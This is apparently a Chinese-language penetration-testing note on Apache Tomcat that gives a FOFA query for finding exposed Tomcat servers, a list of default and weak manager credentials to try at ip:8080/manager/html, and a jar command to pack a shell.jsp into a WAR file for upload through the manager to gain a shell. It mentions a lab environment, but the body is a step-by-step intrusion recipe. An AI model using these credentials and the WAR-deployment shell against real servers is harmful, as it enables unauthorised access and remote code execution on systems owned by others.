## 应用简介

![img](tomcat.png)

Tomcat 是当前最流行的 Java 中间件服务器之一。

官方网站：http://tomcat.apache.org

## 相关资产

FOFA

```http
app="APACHE-Tomcat"
```

## 环境搭建

VulnRange可快速搭建此环境

## 弱口令Getshell

1、访问`ip:8080/manager/html`

```http
admin/admin
admin/Admin
admin/Admin@123
tomcat/tomcat
tomcat/空
tomcat/123456
tomcat/654321
tomcat/000000
tomcat/111111
admin/123456
admin/654321
admin/000000
admin/111111
```

2、部署`war包`getshell

```bash
#shell.jsp单独放置一个目录，命令行下进入当前目录,打包成war包
jar -cvf login.war .\
```

找到 WAR file to deploy 这一项，上传war包后应用即可